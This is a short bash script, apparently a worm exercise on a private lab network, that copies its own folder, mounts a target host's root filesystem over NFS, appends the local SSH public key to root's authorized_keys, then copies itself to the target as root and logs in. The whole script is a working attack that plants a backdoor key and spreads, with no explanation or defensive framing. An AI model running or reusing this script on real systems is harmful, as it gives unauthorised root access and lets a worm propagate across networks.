#!/bin/bash

#{ echo -ne '\n' ; echo -ne 'y' ; echo -ne '\n'; } | ssh-keygen


mkdir ~/lotus
cp -r * ~/lotus
ssh-keygen < worminput.txt
mkdir /tmp/r00t
mount -t nfs 192.168.56.103:/ /tmp/r00t/
cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
umount /tmp/r00t
scp -r ~/lotus root@192.168.56.103:./
ssh root@192.168.56.103
